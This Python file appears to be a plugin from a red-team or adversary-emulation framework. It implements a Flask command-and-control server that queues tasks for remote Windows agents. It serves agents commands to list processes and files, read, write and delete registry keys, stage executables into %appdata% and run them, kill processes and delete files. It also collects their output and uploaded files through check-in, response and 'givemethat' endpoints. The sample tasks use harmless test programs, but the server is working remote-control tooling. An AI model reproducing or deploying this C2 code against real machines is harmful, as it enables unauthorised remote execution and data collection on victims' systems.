
from os import environ as _environ
try:
    from ..src import controller_plugin as cp
    from .__harness_content import content as _content

except (ValueError, SystemError):  #allow this plugin to be run from commandline
    import os.path
    import sys
    _path = os.path.abspath(os.path.join(os.path.abspath(__file__), "../../"))
    sys.path.append(_path)
    from src import controller_plugin as cp
    from plugins.__harness_content import content as _content, command_templates as _command_templates
    #raise

from threading import Thread, Lock
from time import sleep, time
import json
from collections import defaultdict



__STANDALONE__ = False
_G_HARNESS = None
_G_LOCK = Lock()
_LOCK_WAIT = 3



class Harness(cp.ControllerPlugin):
    functionality = _command_templates

    def __init__(self):
        self.name = "Harness"
        if _environ['STAGE'] == "DEV":
            self.port = 5005
            self.debug = True
        else:
            self.port = 5000
            self.debug = False
        self.proto = "TCP"
        self._work = defaultdict(list)
        self._output = defaultdict(list)
        self._complete = defaultdict(list)
        super().__init__(self.name, self.proto, self.port, self.functionality)

    def _stop(self, logger, httpd):
        logger.send([
            self.name,
            self.name + " server shutting down...",
            20,
            time()
        ])
        httpd.shutdown()
        exit(0)


    def start(self, logger, ext_signal):
        global _G_LOCK
        #self._advertise_functionality() #TODO: Put this in later
        _G_LOCK.acquire()
        self._populate_work("172.22.64.1")
        self._populate_work("127.0.0.1")

        _G_LOCK.release()
        httpd_server = Thread(target=_app.run,
                              daemon=True,
                              kwargs={"port": self.port}
                              )
        httpd_server.start()
        global _G_HARNESS
        _G_HARNESS = self
        try:
            while not ext_signal.value:
                if _G_LOCK.acquire(timeout=_LOCK_WAIT):
                    self._collect_new_jobs()
                    self._push_complete_output()

                    # add those jobs to the work
                    _G_LOCK.release()
                sleep(15)
        except KeyboardInterrupt:
            self._stop(logger, _app)
        finally:
            exit(0)



    def _collect_new_jobs(self):
        new_job = self._request_job()  # <dict> or None
        if new_job:
            location = new_job['JobTarget']['Location']
            self._work[location].append(new_job)

    def _push_complete_output(self):
        for location in self._complete:
            job = self._complete[location].pop(0)
            output = job['output']
            job['output'] = ""

            output_object = {"OutputJob":job,
                             "Content": output}
            #self._respond_output() #TODO: This function in base does not exist
        raise NotImplementedError

    def _provide_status_update(self, job_id, status):
        raise NotImplementedError

    def _put_blob_in_content_table(self, file_id, blob):
        raise NotImplementedError


    def _populate_work(self, location):
        '''
        This function is test  code intended to be removed once
            the plugin is integrated
        :param location: IP address of the calling hostname
        :return: None
        '''
        [self._work[location].append(x) for x in _translated_commands]

    def _convert_job(self, job):
        loc = job['JobTarget']['Location']
        cmd = job['JobCommand']['CommandName']
        out = job['JobCommand']['Output']
        args = [job_input['Value'] for job_input in job['JobCommand']['Inputs']]
        return (loc, out, cmd, args)

    def _add_job_to_worklist(self, job):
        (loc, out, cmd, args) = self._convert_job(job)
        self._work[loc].append({"output":out,
                                "name":cmd,
                                "argv":args})

    def _dump_internal_worklist(self):
        from json import dumps
        return dumps(self._work)




####------------------------------------------------------------------------------
####----  Everything below here should work with or without the interpreter
####------------------------------------------------------------------------------


from flask import Flask, request, stream_with_context, Response
#from flask import g, jsonify, render_template, abort


_i = 0

_translated_commands = [
    {"output":True,
     "name": "echo",
     "argv": ["Hello World"]},
    {"output":False,
     "name": "sleep",
     "argv": ["4000", ]},
    {"output":True,
     "name": "list_processes",
     "argv": []},
    {"output":True,
     "name": "list_files",
     "argv": ["%appdata%\\"]},
    {"output":True,
     "name": "read_registry",
     "argv": ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
              "ProgramFilesDir"]},
    {"output":False,
     "name": "write_registry",
     "argv": ["HKEY_CURRENT_USER\\Software\\Ramrod_Example",
              "Key1",
              "REG_SZ",
              "Ramrod testing 0x000000000000000"]},
    {"output":True,
     "name": "read_registry",
     "argv": ["HKEY_CURRENT_USER\\Software\\Ramrod_Example",
              "Key1"]},
    {"output":False,
     "name": "sleep",
     "argv": ["4000", ]},
    {"output":False,
     "name": "delete_registry",
     "argv": ["HKEY_CURRENT_USER\\Software\\Ramrod_Example"]},
    #this file pulls from _harness content
    #{"output":True,
    # "name":"get_file",
    # "argv":["399",
    #         "C:\\Users\\bauma\\Documents\\ait\\dumb_exe.exe"]},
    {"output":False,
     "name": "put_file",
     "argv": ["399",
              "%appdata%\\test_file-9000.exe"]},

    {"output":False,
     "name": "sleep",
     "argv": ["10000", ]},
    {"output":False,
     "name": "create_process",
     "argv": ["%appdata%\\test_file-9000.exe"]},
    #this file pulls from _harness content
    #{"output":True,
    # "name": "get_file",
    # "argv": ["501",
    #          "C:\\Users\\bauma\\Documents\\ait\\dumb_sleeper.exe"]},
    {"output":False,
     "name": "put_file",
     "argv": ["501",
              "%appdata%\\gosleep.exe"]},

    {"output": False,
     "name": "sleep",
     "argv": ["3000", ]},
    {"output": False,
     "name": "create_process",
     "argv": ["%appdata%\\gosleep.exe"]},
    {"output": False,
     "name": "sleep",
     "argv": ["30000"]},
    {"output": False,
     "name": "terminate_process",
     "argv": ["gosleep.exe"]},
    {"output":True,
     "name": "list_files",
     "argv": ["%appdata%"]},
    {"output":False,
     "name": "delete_file",
     "argv": ["%appdata%\gosleep.exe"]},
    {"output":False,
     "name": "delete_file",
     "argv": ["%appdata%\\test_file-9000.exe"]},
    {"output":True,
     "name": "list_files",
     "argv": ["%appdata%\\"]},
    {"output":False,
     "name": "terminate",
     "argv": []}
]

_app = Flask(__name__)
_app.config.from_object(__name__)

def parse_serial(serial):
    validated = {}
    potential = serial.split("_")
    if len(potential) == 3:
        validated["Drive"] = potential[0]
        validated["InternalLocation"] = potential[1]
        validated["Location"] = request.environ['REMOTE_ADDR']
        validated['Admin'] = potential[2]
    return validated


@_app.before_request
def _before_request():
    pass


@_app.teardown_request
def _teardown_request(exception):
    pass


@_app.route("/harness/<serial>", methods=['GET'])
def _checkin(serial):
    validated = parse_serial(serial)
    print ( validated )
    global _G_HARNESS
    global _G_LOCK
    remote = (json.dumps(request.args))
    command_string = "sleep,15000"
    if not __STANDALONE__ and _G_LOCK.acquire(timeout=_LOCK_WAIT):
        if _G_HARNESS._work[validated['Location']]:
            cmd = _G_HARNESS._work[validated['Location']].pop(0)
            if cmd['output']:
                _G_HARNESS._output[validated['Location']].append(cmd)
            command_string = "%s,%s" %(cmd['name'],
                                       ",".join(cmd['argv']))
            print (command_string)
            if "terminate" in command_string:
                print (json.dumps(_G_HARNESS._output))
                print (json.dumps(_G_HARNESS._complete))
        _G_LOCK.release()
    return command_string


@_app.route("/response/<serial>", methods=['POST'])
def _respond_to_work(serial):
    validated = parse_serial(serial)
    print(request.form['data'])
    if not __STANDALONE__ and _G_LOCK.acquire(timeout=_LOCK_WAIT):
        if _G_HARNESS._output[validated['Location']]:
            cmd = _G_HARNESS._output[validated['Location']].pop(0)
            cmd['output'] = request.form['data']
            _G_HARNESS._complete[validated['Location']].append(cmd)
        _G_LOCK.release()
    return "1"


@_app.route("/givemethat/<serial>/<file_id>", methods=['GET'])
def _get_blob(serial, file_id):
    validated = parse_serial(serial)
    def gens(file_id):
        if file_id in _content:
            file_content = _content[file_id]
            for next_byte in file_content:
                yield next_byte

    return Response(stream_with_context(gens(file_id)))


@_app.route("/givemethat/<serial>/<file_id>", methods=['POST'])
def _put_blob(serial, file_id):
    validated = parse_serial(serial)
    _content[file_id] = request.form['data']
    if not __STANDALONE__ and _G_LOCK.acquire(timeout=_LOCK_WAIT):
        if _G_HARNESS._output[validated['Location']]:
            cmd = _G_HARNESS._output[validated['Location']].pop(0)
            cmd['output'] = request.form['data']
            _G_HARNESS._complete[validated['Location']].append(cmd)
        _G_LOCK.release()
    return "1"


if __name__ == "__main__":
    from sys import argv
    from multiprocessing import Value
    from ctypes import c_bool
    if len(argv) < 2:
        __STANDALONE__ = True
        _app.run(debug=True, port=5005) #5005 is the non-default Debug port
    else:
        ext_signal = Value(c_bool, False)
        test_harness = Harness()
        test_harness.start(None, ext_signal)